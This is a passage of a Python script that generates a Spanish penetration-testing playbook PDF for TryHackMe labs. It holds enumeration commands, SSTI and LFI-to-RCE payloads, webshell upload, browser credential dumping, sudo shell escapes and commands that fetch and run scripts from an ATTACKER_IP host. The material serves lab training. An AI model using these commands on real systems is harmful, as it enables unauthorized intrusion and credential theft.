from pathlib import Path

from pypdf import PdfReader, PdfWriter
from pypdf.annotations import Link
from pypdf.generic import ArrayObject, NumberObject
from reportlab.lib import colors
from reportlab.lib.enums import TA_CENTER
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
from reportlab.lib.units import cm
from reportlab.pdfbase.pdfmetrics import stringWidth
from reportlab.pdfgen import canvas
from reportlab.platypus import (
    PageBreak,
    Paragraph,
    Preformatted,
    SimpleDocTemplate,
    Spacer,
    Table,
    TableStyle,
)


ROOT = Path(__file__).resolve().parents[1]
OUT_DIR = ROOT / "output" / "pdf"
TMP_DIR = ROOT / "tmp" / "pdfs_structured"
OUT_DIR.mkdir(parents=True, exist_ok=True)
TMP_DIR.mkdir(parents=True, exist_ok=True)


def norm(text):
    replacements = {
        "—": "-",
        "–": "-",
        "“": '"',
        "”": '"',
        "‘": "'",
        "’": "'",
        "→": "->",
    }
    text = str(text)
    for src, dst in replacements.items():
        text = text.replace(src, dst)
    return text


styles = getSampleStyleSheet()
styles.add(
    ParagraphStyle(
        name="TitleX",
        parent=styles["Title"],
        fontName="Helvetica-Bold",
        fontSize=24,
        leading=29,
        alignment=TA_CENTER,
        textColor=colors.HexColor("#111827"),
        spaceAfter=14,
    )
)
styles.add(
    ParagraphStyle(
        name="SubX",
        parent=styles["Normal"],
        fontSize=10.5,
        leading=14,
        alignment=TA_CENTER,
        textColor=colors.HexColor("#475467"),
        spaceAfter=16,
    )
)
styles.add(
    ParagraphStyle(
        name="H1X",
        parent=styles["Heading1"],
        fontName="Helvetica-Bold",
        fontSize=17,
        leading=21,
        textColor=colors.HexColor("#111827"),
        spaceBefore=8,
        spaceAfter=7,
    )
)
styles.add(
    ParagraphStyle(
        name="H2X",
        parent=styles["Heading2"],
        fontName="Helvetica-Bold",
        fontSize=12.2,
        leading=15,
        textColor=colors.HexColor("#1f2937"),
        spaceBefore=7,
        spaceAfter=4,
    )
)
styles.add(
    ParagraphStyle(
        name="BodyX",
        parent=styles["BodyText"],
        fontSize=9,
        leading=12.1,
        textColor=colors.HexColor("#1f2937"),
        spaceAfter=5,
    )
)
styles.add(
    ParagraphStyle(
        name="SmallX",
        parent=styles["BodyText"],
        fontSize=7.6,
        leading=9.2,
        textColor=colors.HexColor("#475467"),
        spaceAfter=3,
    )
)
styles.add(
    ParagraphStyle(
        name="CellX",
        parent=styles["BodyText"],
        fontSize=7.2,
        leading=8.8,
        textColor=colors.HexColor("#1f2937"),
    )
)
styles.add(
    ParagraphStyle(
        name="HeadCellX",
        parent=styles["BodyText"],
        fontName="Helvetica-Bold",
        fontSize=7.2,
        leading=8.8,
        textColor=colors.white,
    )
)


def p(text, style="BodyX"):
    return Paragraph(norm(text), styles[style])


def bullets(items):
    return [p("&bull; " + item) for item in items]


def code(lines):
    return Preformatted(
        norm("\n".join(lines)),
        ParagraphStyle(
            name="CodeX",
            fontName="Courier",
            fontSize=7,
            leading=8.7,
            textColor=colors.HexColor("#111827"),
            backColor=colors.HexColor("#f5f7fa"),
            borderColor=colors.HexColor("#d0d5dd"),
            borderWidth=0.35,
            borderPadding=5,
            spaceBefore=3,
            spaceAfter=7,
        ),
    )


def table(rows, widths=None):
    if widths is None:
        widths = [4.0 * cm, 12.2 * cm]
    data = []
    for r, row in enumerate(rows):
        style = "HeadCellX" if r == 0 else "CellX"
        data.append([p(cell, style) for cell in row])
    t = Table(data, colWidths=widths, hAlign="LEFT", repeatRows=1)
    t.setStyle(
        TableStyle(
            [
                ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#111827")),
                ("BOX", (0, 0), (-1, -1), 0.35, colors.HexColor("#d0d5dd")),
                ("INNERGRID", (0, 0), (-1, -1), 0.25, colors.HexColor("#eaecf0")),
                ("VALIGN", (0, 0), (-1, -1), "TOP"),
                ("LEFTPADDING", (0, 0), (-1, -1), 5),
                ("RIGHTPADDING", (0, 0), (-1, -1), 5),
                ("TOPPADDING", (0, 0), (-1, -1), 4),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
            ]
        )
    )
    return t


def on_page(canvas_obj, doc):
    width, _ = A4
    canvas_obj.saveState()
    canvas_obj.setFont("Helvetica", 8)
    canvas_obj.setFillColor(colors.HexColor("#667085"))
    canvas_obj.drawString(1.45 * cm, 1.0 * cm, "THM Playbook Estructurado")
    canvas_obj.drawRightString(width - 1.45 * cm, 1.0 * cm, "Volver al indice")
    canvas_obj.restoreState()


SECTIONS = [
    {
        "title": "Ultra quick start",
        "short": "Ultra quick start",
        "summary": "La hoja minima para empezar cualquier room sin pensar demasiado.",
        "blocks": [
            ("p", "Usa esta pagina cuando quieras arrancar rapido. La idea es no quedarse mirando la terminal: descubre superficie, enumera lo que exista, busca credenciales o bugs, consigue acceso, escala y documenta."),
            ("table", [
                ["Fase", "Accion minima", "Resultado esperado"],
                ["1. Preparar", "Crear carpetas, fijar IP/URL, anadir hostname si aplica.", "Entorno ordenado y variables listas."],
                ["2. Descubrir", "nmap full TCP + servicios sobre puertos abiertos.", "Lista real de puertos y versiones."],
                ["3. Enumerar", "Seguir el servicio dominante: web, SMB, AD, DNS, SNMP, NFS.", "Usuarios, rutas, shares, endpoints o versiones."],
                ["4. Priorizar", "Elegir 1-2 hipotesis con evidencia, no probar todo a la vez.", "Vector candidato claro."],
                ["5. Acceso", "Cred reuse, RCE, upload, SSH, WinRM, SQLi o panel admin.", "Shell o login util."],
                ["6. Post-exploit", "whoami/id, grupos, procesos, archivos, configs, credenciales.", "Mapa del contexto local."],
                ["7. Privesc", "Linux: sudo/SUID/caps/cron/creds. Windows: privs/servicios/tareas/creds.", "Usuario superior o root/admin."],
                ["8. Reenumerar", "Cada credencial nueva reinicia SMB/web/sudo/WinRM/LDAP/DB.", "Nuevas rutas desbloqueadas."],
                ["9. Cierre", "Guardar comandos minimos, evidencia, flags y root cause.", "Writeup reproducible."],
            ], [2.7 * cm, 6.6 * cm, 6.9 * cm]),
            ("h2", "Comandos base"),
            ("code", [
                "mkdir -p nmap web loot creds hashes screenshots exploits notes",
                "export IP=10.10.10.10",
                "export URL=http://target.local",
                "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
                "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
            ]),
            ("bullets", [
                "Si ves web, pasa a discovery/Burp antes de brute force.",
                "Si ves SMB/AD, busca usuarios reales antes de passwords.",
                "Si consigues una credencial, vuelve a enumerar. No sigas explotando a ciegas.",
            ]),
        ],
    },
    {
        "title": "1. Mentalidad y preparacion",
        "short": "Mentalidad y preparacion",
        "summary": "Como empezar una room sin perder contexto.",
        "blocks": [
            ("p", "Este documento es la version curada del master: conserva lo importante, elimina repeticion y lo ordena como una cadena de trabajo. La pregunta constante no es 'que comando toca', sino 'que hallazgo desbloquea el siguiente paso'."),
            ("table", [
                ["Pregunta", "Por que importa"],
                ["Quien es el objetivo?", "IP, hostname, dominio y tecnologia condicionan todas las herramientas."],
                ["Que superficie existe?", "Puertos y servicios deciden si vas a web, SMB, AD, SQLi, NFS, SNMP o pivot."],
                ["Que credenciales tengo?", "Cada nueva identidad obliga a reenumerar."],
                ["Que puedo controlar?", "La escalada aparece cuando modificas algo que ejecuta o lee un usuario superior."],
            ], [5.2 * cm, 11.0 * cm]),
            ("h2", "Preparacion minima"),
            ("code", [
                "mkdir -p nmap web loot creds hashes screenshots exploits notes",
                "export IP=10.10.10.10",
                "export URL=http://target.local",
                "echo '10.10.10.10 target.local' | sudo tee -a /etc/hosts",
            ]),
            ("bullets", [
                "Crea estructura de evidencia antes de empezar, no cuando ya tienes diez terminales abiertas.",
                "Anota comandos que cambian una decision: credencial valida, ruta vulnerable, usuario encontrado, servicio interno.",
                "En THM/CTF esta guia asume autorizacion de laboratorio. Fuera de ese contexto no ejecutes tecnicas ofensivas.",
            ]),
        ],
    },
    {
        "title": "2. Mapa rapido de decisiones",
        "short": "Mapa de decisiones",
        "summary": "Si veo X, priorizo Y.",
        "blocks": [
            ("table", [
                ["Senal", "Prueba prioritaria"],
                ["80/443", "whatweb, curl, robots/sitemap, ffuf/gobuster, Burp, vhosts."],
                ["WordPress", "WPScan, wp-json, usuarios, plugins/temas, uploads, XML-RPC."],
                ["Parametro sospechoso", "LFI, SQLi, SSTI, command injection, IDOR si hay IDs."],
                ["445/139", "smbclient, smbmap, nxc, enum4linux, RID brute si AD."],
                ["53", "dig/nslookup, AXFR si hay dominio, nombres para /etc/hosts."],
                ["161", "snmpwalk y busqueda de usuarios, rutas, procesos, configs."],
                ["2049", "showmount, mount, revisar permisos y archivos reutilizables."],
                ["Shell Linux", "id, sudo -l, SUID, capabilities, cron, systemd, creds, linpeas/pspy."],
                ["Shell Windows", "whoami /priv, servicios, tareas, registry, winPEAS, creds."],
                ["Dominio AD", "SMB/LDAP/Kerberos: usuarios, spraying controlado, Kerberoast/AS-REP, BloodHound."],
                ["Servicio interno", "Pivot con SSH -L/-D, chisel o ligolo-ng."],
            ], [4.6 * cm, 11.6 * cm]),
            ("p", "No ejecutes todas las pruebas a la vez. El orden correcto es el que reduce incertidumbre con menos ruido."),
        ],
    },
    {
        "title": "Arquetipos de rooms",
        "short": "Arquetipos de rooms",
        "summary": "Reconocer el tipo de room y elegir una ruta de trabajo.",
        "blocks": [
            ("p", "Un arquetipo no es una regla absoluta, pero ayuda a decidir por donde empezar. Si una room mezcla varios patrones, resuelve primero el que te de identidad, credenciales o una shell inicial."),
            ("table", [
                ["Arquetipo", "Senales", "Ruta recomendada"],
                ["Web basica", "80/443, login, rutas ocultas, uploads.", "Discovery -> Burp -> LFI/SSTI/upload/IDOR/creds."],
                ["WordPress/CMS", "wp-content, wp-login, plugins, temas.", "WPScan -> usuarios -> plugins/temas -> creds/wp-admin -> RCE."],
                ["SQLi room", "Parametros, errores SQL, login bypass.", "Confirmar manual -> sqlmap con request -> dump -> hashes/RCE si aplica."],
                ["SMB/Linux mixta", "445, shares, backups, usuarios reutilizables.", "Shares -> loot -> cred reuse -> SSH/web/sudo."],
                ["Active Directory", "53/88/389/445, dominio, DC.", "Hosts/DNS -> usuarios -> spraying controlado -> Kerberos/BloodHound."],
                ["Linux privesc", "Shell Linux sin root.", "id/sudo -l -> SUID -> caps -> cron/systemd -> creds."],
                ["Windows privesc", "Shell Windows sin admin.", "whoami /priv -> servicios -> tareas -> registry -> creds."],
                ["Pivoting", "Servicios localhost o red interna no accesible.", "Rutas/interfaces -> ssh -L/-D, chisel o ligolo -> reenum interna."],
                ["Cracking/loot", "Hashes, kdbx, id_rsa, zips, backups.", "Convertir con *2john -> crackear -> cred reuse controlado."],
                ["CVE/exploit", "Version concreta vulnerable.", "Verificar version/config -> leer PoC -> check -> payload minimo."],
            ], [3.0 * cm, 5.2 * cm, 8.0 * cm]),
            ("h2", "Como usar esta tabla"),
            ("bullets", [
                "Elige el arquetipo por evidencia, no por intuicion: puertos, rutas, banners, usuarios o archivos.",
                "Si aparecen credenciales, salta a reutilizacion controlada y reenumeracion.",
                "Si no hay progreso en 20-30 minutos, usa la checklist de atasco antes de abrir exploits nuevos.",
            ]),
        ],
    },
    {
        "title": "3. Reconocimiento y enumeracion de servicios",
        "short": "Recon y servicios",
        "summary": "Encontrar superficie, nombres, versiones y rutas de entrada.",
        "blocks": [
            ("h2", "Escaneo inicial"),
            ("code", [
                "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
                "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
                "sudo nmap -sU --top-ports 200 -sV $IP -oN nmap/udp.txt",
            ]),
            ("bullets", [
                "Usa -Pn si la maquina filtra ping.",
                "Primero descubre puertos; despues enumera versiones y scripts.",
                "UDP merece una pasada si sospechas DNS, SNMP, TFTP o NFS.",
            ]),
            ("h2", "HTTP / Web (80, 443, 8080)"),
            ("code", [
                "whatweb $URL",
                "curl -sSI $URL",
                "curl -sS $URL/robots.txt",
                "nikto -h $URL",
                "gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 40",
                "ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
                "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ",
                "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/",
                "ffuf -u $URL -H 'Host: FUZZ.$DOMAIN' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0",
                "wfuzz -c -H 'Host: FUZZ.$DOMAIN' -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/",
            ]),
            ("h2", "SMB (139, 445)"),
            ("code", [
                "nxc smb $IP",
                "nxc smb $IP -u '' -p '' --shares",
                "nxc smb $IP -u 'guest' -p '' --shares",
                "smbclient -L //$IP -N",
                "smbclient //$IP/share -N",
                "smbmap -H $IP",
                "enum4linux-ng -A $IP",
                "nxc smb $IP -u 'guest' -p '' --rid-brute",
            ]),
            ("h2", "RPC / NetBIOS (135, 137)"),
            ("code", [
                "rpcclient -U '' -N $IP",
                "rpcclient -U '' -N $IP -c 'enumdomusers'",
                "rpcclient -U '' -N $IP -c 'querydominfo'",
                "nmblookup -A $IP",
            ]),
            ("h2", "FTP (21)"),
            ("code", [
                "ftp $IP",
                "nmap --script ftp-anon -p 21 $IP",
                "wget -m --no-passive ftp://anonymous:anonymous@$IP",
            ]),
            ("h2", "DNS (53)"),
            ("code", [
                "dig @$IP $DOMAIN",
                "dig axfr @$IP $DOMAIN",
                "dnsrecon -d $DOMAIN -n $IP",
                "nslookup -type=any $DOMAIN $IP",
            ]),
            ("h2", "SNMP (161/udp)"),
            ("code", [
                "snmpwalk -v2c -c public $IP",
                "snmpbulkwalk -v2c -c public $IP",
                "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP",
            ]),
            ("h2", "NFS (2049)"),
            ("code", [
                "showmount -e $IP",
                "mkdir -p /mnt/nfs && sudo mount -t nfs $IP:/share /mnt/nfs -o nolock",
            ]),
            ("h2", "LDAP (389, 636)"),
            ("code", [
                "ldapsearch -x -H ldap://$IP -s base namingContexts",
                "ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local'",
                "nxc ldap $IP -u '' -p ''",
            ]),
            ("h2", "Bases de datos (3306, 1433, 5432, 6379)"),
            ("code", [
                "mysql -h $IP -u root -p",
                "impacket-mssqlclient $USER:$PASS@$IP -windows-auth",
                "psql -h $IP -U postgres",
                "redis-cli -h $IP",
            ]),
            ("h2", "SMTP (25) / RDP (3389)"),
            ("code", [
                "nc -nv $IP 25",
                "smtp-user-enum -M VRFY -U users.txt -t $IP",
                "swaks --to test@$DOMAIN --server $IP",
                "xfreerdp /v:$IP /u:$USER /p:$PASS +clipboard /dynamic-resolution",
                "nmap --script rdp-enum-encryption -p 3389 $IP",
            ]),
            ("h2", "Servicios tipicos"),
            ("table", [
                ["Servicio", "Comandos utiles"],
                ["SMB", "smbclient -L //$IP -N; smbmap -H $IP; nxc smb $IP --shares"],
                ["FTP", "ftp $IP; probar anonymous; wget -m ftp://anonymous:anonymous@$IP/"],
                ["DNS", "dig @$IP dominio; dig axfr @$IP dominio; dnsrecon -d dominio -n $IP"],
                ["SNMP", "snmpwalk -v2c -c public $IP; onesixtyone -c community.txt $IP"],
                ["NFS", "showmount -e $IP; mount -t nfs $IP:/share /mnt/share"],
                ["SSH", "probar claves, usuarios filtrados y passphrases con ssh2john."],
            ], [3.2 * cm, 13.0 * cm]),
        ],
    },
    {
        "title": "4. Web clasica y APIs modernas",
        "short": "Web y APIs",
        "summary": "De discovery web a bugs de autorizacion, SSRF, JWT y uploads.",
        "blocks": [
            ("h2", "Fingerprinting y discovery"),
            ("code", [
                "curl -i $URL/",
                "whatweb -a 3 $URL",
                "ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404",
                "ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0",
                "gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404",
                "gobuster vhost -u $URL -w subdomains.txt --append-domain",
                "feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html",
                "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ",
                "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ",
                "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z",
                "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.old,.zip -fc 404",
                "ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404",
                "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0",
                "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php",
                "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404",
                "katana -u $URL -d 3",
                "arjun -u \"$URL/page.php\"",
            ]),
            ("bullets", [
                "Si todo devuelve 200, mide una ruta random y filtra por -fs/-fw/-fl en ffuf o --hh/--hw/--hl en wfuzz.",
                "Separa fuzzing de rutas, archivos, vhosts y parametros; mezclarlo todo genera ruido y pierdes hallazgos.",
                "En APIs prueba primero endpoints conocidos por JS/katana y despues fuzzing sobre /api, /v1, /graphql o rutas versionadas.",
                "En THM empieza con wordlists pequenas y sube a raft/medium cuando tengas senales reales.",
                "Fuzzea el metodo HTTP (GET/POST/PUT/DELETE/PATCH): un endpoint puede aceptar datos o ser inyectable solo por un verbo concreto.",
            ]),
            ("h2", "APIs REST y metodos HTTP"),
            ("code", [
                "curl -sS $URL/api/ ; curl -sS $URL/api/v1/",
                "curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs",
                "curl -sS -i -X OPTIONS \"$URL/api/resource\"",
                "for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done",
                "curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}'",
                "curl -sS -i -X POST \"$URL/api/resource\" -H 'X-HTTP-Method-Override: PUT'",
                "curl -sS -X POST \"$URL/api/login\" -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'",
                "curl -sS -X POST \"$URL/api/search\" -H 'Content-Type: application/json' -d '{\"q\":\"1 OR 1=1-- -\"}'",
                "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
                "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\"",
                "sqlmap -r request.txt --batch --level 3",
            ]),
            ("h2", "Explotacion web (LFI / SSTI / upload)"),
            ("code", [
                "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
                "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\"",
                "curl -sS \"$URL/page.php?file=/proc/self/environ\"",
                "curl -sS \"$URL/?name={{7*7}}\"",
                "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"",
                "weevely generate S3cr3t shell.php",
                "curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\"",
                "weevely $URL/uploads/shell.php S3cr3t",
                "git-dumper $URL/.git/ ./loot_git",
                "curl -sS \"$URL/.git/HEAD\"",
            ]),
            ("h2", "LFI a RCE"),
            ("code", [
                "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=config.php\"",
                "curl -sS \"$URL/page.php?file=/var/log/apache2/access.log\"",
                "curl -sS \"$URL/\" -A 'PAYLOAD_PHP'; curl -sS \"$URL/page.php?file=/var/log/apache2/access.log&c=id\"",
                "curl -sS --data 'PAYLOAD_PHP' \"$URL/page.php?file=php://input&c=id\"",
                "curl -sS \"$URL/page.php?file=data://text/plain;base64,BASE64_PHP&c=id\"",
                "curl -sS \"$URL/page.php?file=/proc/self/environ\" -A 'PAYLOAD_PHP'",
                "python3 php_filter_chain_generator.py --chain 'PAYLOAD_PHP'",
            ]),
            ("bullets", [
                "LFI a RCE: si puedes incluir un fichero, busca uno que TU controles (logs con tu User-Agent, /proc/self/environ, php://input o data://).",
                "PAYLOAD_PHP es tu codigo PHP minimo (un system del parametro c); envenenas el log/entrada y luego lo incluyes con ?file= para que se ejecute.",
                "Si solo puedes leer, php://filter saca el codigo fuente en base64: ahi suelen estar las credenciales de BD.",
            ]),
            ("h2", "Triage de bugs"),
            ("table", [
                ["Bug", "Senales y prueba inicial"],
                ["LFI", "Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter."],
                ["SSTI", "Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar."],
                ["IDOR/BOLA", "Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota."],
                ["JWT", "Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil."],
                ["GraphQL", "Introspection, tipos, queries/mutations con id/userId/admin/debug."],
                ["SSRF", "Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost."],
                ["XXE", "Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab."],
                ["Upload", "Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion."],
                ["Command injection", "host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado."],
            ], [3.6 * cm, 12.6 * cm]),
        ],
    },
    {
        "title": "5. WordPress y CMS",
        "short": "WordPress",
        "summary": "Workflow reducido para cuando detectas WordPress.",
        "blocks": [
            ("h2", "Confirmar y enumerar"),
            ("code", [
                "curl -sS -I $URL/wp-login.php | head",
                "curl -sS $URL/ | grep -iE \"wp-content|wp-includes\" | head",
                "wpscan --url $URL --enumerate p,t,u",
                "wpscan --url $URL --plugins-detection mixed --enumerate ap,at,u",
                "curl -sS \"$URL/wp-json/wp/v2/users?per_page=100\" | head",
            ]),
            ("bullets", [
                "Prioriza plugins/temas frente al core si WordPress esta actualizado.",
                "Revisa uploads, backups de wp-config.php, XML-RPC y REST API.",
                "Con wp-admin, busca plugins vulnerables, upload/import y roles. En CTF puede haber RCE por theme/plugin editor.",
            ]),
            ("table", [
                ["Hallazgo", "Siguiente paso"],
                ["Usuario WP", "Probar password reuse o WPScan brute force moderado si el lab lo permite."],
                ["Plugin versionado", "Buscar CVE, exploit-db, WPScan API y PoC legible."],
                ["wp-config filtrado", "Extraer DB creds, conectar MySQL, buscar hashes o admin."],
                ["Acceso admin", "Subida plugin/theme o funcionalidad vulnerable; documentar vector exacto."],
            ], [4.0 * cm, 12.2 * cm]),
        ],
    },
    {
        "title": "6. SQL Injection",
        "short": "SQLi",
        "summary": "Confirmar, extraer y decidir cuando usar SQLMap.",
        "blocks": [
            ("p", "SQLi se resuelve mejor si primero entiendes el tipo de inyeccion. SQLMap acelera, pero una confirmacion manual evita falsos positivos y ruido."),
            ("table", [
                ["Tipo", "Senal"],
                ["Error-based", "Errores SQL visibles por comillas, casts o payloads invalidos."],
                ["UNION-based", "La respuesta refleja columnas y puedes alinear SELECT/UNION."],
                ["Boolean blind", "La respuesta cambia con condiciones true/false."],
                ["Time blind", "No ves datos, pero sleep/pg_sleep/waitfor delay modifica tiempos."],
                ["Second-order", "El payload se almacena y se ejecuta en otra vista o accion posterior."],
            ], [3.6 * cm, 12.6 * cm]),
            ("h2", "SQLMap practico"),
            ("code", [
                "sqlmap -r request.txt --batch",
                "sqlmap -r request.txt --dbs",
                "sqlmap -r request.txt -D db -T users --dump",
                "sqlmap -u \"$URL/page.php?id=1\" --risk 2 --level 3 --batch",
                "sqlmap -r request.txt --os-shell",
            ]),
            ("bullets", [
                "Usa requests de Burp para cookies, headers, POST y auth.",
                "Sube risk/level solo si la confirmacion basica no basta.",
                "Si el objetivo es CTF, extrae lo necesario: usuarios, hashes, configs, rutas o RCE.",
            ]),
        ],
    },
    {
        "title": "7. Credenciales, cracking y loot",
        "short": "Credenciales y loot",
        "summary": "Buscar, convertir, crackear y reutilizar sin caos.",
        "blocks": [
            ("table", [
                ["Fuente", "Que mirar"],
                ["Web root", ".env, config.php, wp-config.php, web.config, appsettings.json."],
                ["Homes", ".ssh, history, Desktop, Downloads, backups, notas."],
                ["Shares", "Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts."],
                ["Windows", "cmdkey, Unattend.xml, PowerShell history, IIS configs."],
                ["Linux", "/var/www, /opt, /var/backups, cron scripts, bash history."],
            ], [3.2 * cm, 13.0 * cm]),
            ("h2", "Conversiones frecuentes"),
            ("code", [
                "hashid 'HASH'",
                "nth -t 'HASH'",
                "ssh2john id_rsa > id_rsa.hash",
                "keepass2john vault.kdbx > keepass.hash",
                "zip2john secret.zip > zip.hash",
                "office2john doc.docx > office.hash",
                "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                "john --show hash.txt",
                "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
            ]),
            ("h2", "Buscar en disco y reutilizar"),
            ("code", [
                "grep -riE 'password|passwd|secret|api_key' /var/www /home /opt 2>/dev/null | head",
                "find / \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '.env' \\) 2>/dev/null",
                "nxc smb $IP -u $USER -p $PASS",
                "nxc winrm $IP -u $USER -p $PASS",
                "ssh $USER@$IP",
            ]),
            ("h2", "Loot de navegadores y apps"),
            ("code", [
                "find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null",
                "python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/",
                "python3 firefox_decrypt.py /ruta/al/perfil",
                "lazagne.exe all",
                "python3 lazagne.py browsers",
            ]),
            ("h2", "Stego y forense de ficheros"),
            ("code", [
                "file archivo; strings -n 8 archivo",
                "exiftool imagen.jpg",
                "binwalk -e archivo",
                "steghide info imagen.jpg ; steghide extract -sf imagen.jpg",
                "stegseek imagen.jpg /usr/share/wordlists/rockyou.txt",
                "zsteg -a imagen.png",
                "foremost -i archivo -o salida",
            ]),
            ("bullets", [
                "Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro.",
                "Etiqueta cada credencial por fuente y servicio probado.",
                "Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP.",
                "En AD evita spraying agresivo; usa usuarios reales y una password candidata con control.",
            ]),
        ],
    },
    {
        "title": "8. Acceso inicial, shells y transferencia",
        "short": "Acceso inicial",
        "summary": "Convertir un hallazgo en shell estable o login util.",
        "blocks": [
            ("table", [
                ["Entrada", "Siguiente paso"],
                ["SSH creds/clave", "chmod 600 id_rsa; ssh -i id_rsa user@$IP; ssh2john si tiene passphrase."],
                ["RCE web", "Confirmar con id/whoami; despues reverse shell o webshell temporal."],
                ["Upload ejecutable", "Validar ruta y ejecucion antes de payload pesado."],
                ["WinRM valido", "evil-winrm -i $IP -u USER -p PASS."],
                ["SMB escritura", "Buscar ejecucion indirecta: scripts, tareas, servicios, web roots."],
            ], [3.2 * cm, 13.0 * cm]),
            ("h2", "Estabilizacion Linux"),
            ("code", [
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "CTRL+Z",
                "stty raw -echo; fg",
                "export TERM=xterm",
            ]),
            ("h2", "Transferencia"),
            ("code", [
                "# Atacante",
                "python3 -m http.server 8000",
                "# Linux victima",
                "wget http://ATTACKER_IP:8000/file -O /tmp/file",
                "curl http://ATTACKER_IP:8000/file -o /tmp/file",
                "# Windows victima",
                "certutil -urlcache -split -f http://ATTACKER_IP:8000/file.exe C:\\Windows\\Temp\\file.exe",
                "powershell -c \"iwr http://ATTACKER_IP:8000/file.exe -OutFile C:\\Windows\\Temp\\file.exe\"",
            ]),
        ],
    },
    {
        "title": "9. Linux privilege escalation",
        "short": "Linux privesc",
        "summary": "De shell normal a root por permisos, tareas, configs o credenciales.",
        "blocks": [
            ("p", "La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial."),
            ("code", [
                "whoami; id; groups; hostname; pwd",
                "find / -perm -4000 -type f -ls 2>/dev/null",
                "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
                "systemctl list-timers 2>/dev/null",
            ]),
            ("h2", "Automatizado (linpeas paso a paso)"),
            ("code", [
                "wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
                "python3 -m http.server 8000",
                "curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh",
                "wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.out",
                "./pspy64",
            ]),
            ("h2", "sudo / GTFOBins"),
            ("code", [
                "sudo -l",
                "sudo find . -exec /bin/sh \\; -quit",
                "sudo vim -c ':!/bin/sh'",
                "sudo env /bin/sh",
                "sudo LD_PRELOAD=/tmp/x.so <binario>",
            ]),
            ("h2", "SUID / SGID"),
            ("code", [
                "find / -perm -4000 -type f 2>/dev/null",
